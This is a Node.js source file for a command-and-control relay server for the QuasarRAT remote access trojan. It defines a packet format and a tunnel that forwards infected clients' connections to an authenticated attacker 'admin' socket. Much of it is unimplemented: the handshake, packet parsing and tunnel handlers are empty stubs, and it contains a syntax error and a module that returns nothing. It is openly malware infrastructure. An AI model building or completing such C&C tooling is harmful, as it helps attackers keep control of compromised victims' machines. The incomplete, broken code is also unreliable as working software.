
/** @file C&C Server implementation for QuasarRAT
  * @author David Landeros (dh.landeros08@gmail.com)
  */

var net = require("net");
var os = require("os");
var config = require("./config.js");

/** @module Utils
  * @desc The Utils module provides access to some utility functions
  */
var Utils = (function{

    const isLittleEndian = os.endianness() == "LE";

    /** @function myFunction
      * @desc Parse a textual IPv4 into an uint32
      * @returns {Number} Decimal representation of the IP address
      */
    function parseIp(str)
    {
        var aux = str.split(".");
        var ui8array = new Uint8Array(4);
        ui8array[0] = parseInt(aux[0]);
        ui8array[1] = parseInt(aux[1]);
        ui8array[2] = parseInt(aux[2]);
        ui8array[3] = parseInt(aux[3]);
        if(isLittleEndian) {
            return new Uint32Array(ui8array.reverse().buffer)[0];
        }
        return new Uint32Array(ui8array.buffer)[0];
    }

    /** @function bufferCopy
      * @desc Copy a range of items from an array to another
      */
    function bufferCopy(source, sindex, dest, dindex, count)
    {
        for(var i = 0; i < count; i++)
        {
            dest[dindex + i] = source[sindex + i];
        }
    }

    /** @function hexDumpBuffer
      * @desc Print an hexadecimal representation of a buffer
      */
    function hexDumpBuffer(buffer)
    {
        var str = Array.prototype.map.call(new Uint8Array(buffer), x => ('00' + x.toString(16)).slice(-2)).join(' ');
        console.log(str);
    }

    /** @function strGetBytes
      * @desc convert a string into an Uint8Array
      */
    function strGetBytes(str)
    {
        var bufView = new Uint8Array(str.length);
        for (var i = 0; i < str.length; i++)
        {
            bufView[i] = str.charCodeAt(i);
        }
        return bufView;
    }

    /** @function uint32GetBytes
      * @desc convert a 32 bits Number into an Uint8Array (Big endian)
      */
    function uint32GetBytes(value)
    {
        var ui32 = new Uint32Array(1);
        ui32[0] = value;
        if(isLittleEndian) {
            return new Uint8Array(ui32.buffer).reverse();
        }
        return new Uint8Array(ui32.buffer);
    }

    /** @function uint32GetBytes
      * @desc convert a 16 bits Number into an Uint8Array (Big endian)
      */
    function uint16GetBytes(value)
    {
        var ui16 = new Uint16Array(1);
        ui16[0] = value;
        if(isLittleEndian) {
            return new Uint8Array(ui16.buffer).reverse();
        }
        return new Uint8Array(ui16.buffer);
    }

    return { parseIp        : parseIp,
             bufferCopy     : bufferCopy,
             hexDumpBuffer  : hexDumpBuffer, 
             strGetBytes    : strGetBytes,
             uint32GetBytes : uint32GetBytes,
             uint16GetBytes : uint16GetBytes };

})();

/** @module TunnelPacket
  * @desc Parses and serializes TunnelPackets
  *       The tunnelPackets are built with the following format:
  *       [ 4 bytes for the Origin IP Address]
  *       [ 2 bytes for the Origin Port (big-endian)]
  *       [ 1 byte for the packet type ]
  *       [ 2 bytes for the payload size (big-endian)]
  *       [ payload (variable length) ]
  *
  * @example
  *     var packet = {
  *        ip      : Utils.parseIp("127.0.0.1"),
  *        port    : 8080,
  *        type    : TunnelPacket.TCP_PSH,
  *        payload : "ABCD",
  *     };
  *     var buffer = TunnelPacket.serialize(packet);
  */
var TunnelPacket = (function(){

    const TCP_SYN = 0x00;
    const TCP_PSH = 0x01;
    const TCP_FIN = 0x02;

    /** @function parse
      * @desc converts a buffer into a TunnelPacket object
      * @returns {Object} a tunnel packet in json format
      */
	function parse(buffer) {
        /* to be implemented */
	}

    /** @function serialize
      * @desc Create a TunnelPacket from its object representation
      * @returns {Uint8Array} the buffer to be sent through the tunnel
      */
	function serialize(obj) {
        var result = new Uint8Array(9 + obj.payload.length);
        Utils.bufferCopy(Utils.uint32GetBytes(obj.ip), 0, result, 0, 4);
        Utils.bufferCopy(Utils.uint16GetBytes(obj.port), 0, result, 4, 2);
        result[6] = obj.type;
        Utils.bufferCopy(Utils.uint16GetBytes(obj.payload.length), 0, result, 7, 2);
        Utils.bufferCopy(Utils.strGetBytes(obj.payload), 0, result, 9, obj.payload.length);
        Utils.hexDumpBuffer(result.buffer);
        return result.buffer;
	}

    return { TCP_SYN   : TCP_SYN,
             TCP_PSH   : TCP_PSH,
             TCP_FIN   : TCP_FIN,
             parse     : parse,
             serialize : serialize };
})();


/** @module Tunnel
  * @desc This module forwards incoming connections (on the clientPort) to the adminSocket,
  * wrapping incomming packets using the TunnelPacket Format.
  *
  * Note: In order to support multiple admins multiple clients, you can convert this module
  * to a class and then create an instance for each admin connection received.
  */
var Tunnel = (function(){

    var clientList = [];

    function init(adminSocket, clientPort)
    {
        net.createServer(function(client) {

            client.on("data", function(data){
                onDataFromClient(client, data);
            });

            client.on("close", function(){
                onClientDisconnected(client);
            });

            client.on("error", function(){});

            onClientConnected(client);

        }).listen(clientPort);

        adminSocket.on("data", function(data){
            onDataFromAdmin(data);
        });
    }

    function onClientConnected()
    {

    }

    function onClientDisconnected()
    {

    }

    function onDataFromClient(client, data)
    {

    }

    function onDataFromAdmin(data)
    {

    }

})();

/** @module CCServer
  * @desc This is the main module, it waits for admins to get connected
  * and then creates a tunnel to forward client connections.
  * This version only supports: single admin multiple clients.
  */
var CCServer = (function() {

    function init() {
        net.createServer(function(socket) {
        	StartHandShaking(socket, function(authorized) {
                if(authorized) {
                    Tunnel.init(socket, config.clientPort);
                }
                else {
                	socket.end();
                }
        	});
        }).listen(config.adminPort);
    }

    function StartHandShaking(socket, callback) {

    }

    /* Exported functions
     */
   return { init : init }
	
})();